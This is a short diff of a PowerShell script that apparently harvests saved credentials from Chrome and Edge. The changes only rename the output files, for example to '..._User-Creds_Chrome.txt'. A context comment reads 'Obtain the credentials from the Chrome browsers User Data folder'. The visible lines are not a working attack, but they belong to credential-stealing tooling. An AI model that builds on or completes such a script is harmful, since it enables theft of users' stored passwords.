@@ -1,4 +1,4 @@
-$FileNameChrome = "$env:Chrome-USERNAME-$(get-date -f yyyy-MM-dd_hh-mm)_User-Creds.txt"
+$FileNameChrome = "$env:USERNAME-$(get-date -f yyyy-MM-dd_hh-mm)_User-Creds_Chrome.txt"
 #Chrome Start
 
 
@@ -39,7 +39,7 @@ Start-Process -FilePath $pathToChrome
 
 #Edge Start
 
-$FileNamemsedge = "$env:msedge-USERNAME-$(get-date -f yyyy-MM-dd_hh-mm)_User-Creds.txt"
+$FileNamemsedge = "$env:USERNAME-$(get-date -f yyyy-MM-dd_hh-mm)_User-Creds_Edge.txt"
 
 #Stage 1 Obtain the credentials from the Chrome browsers User Data folder
 
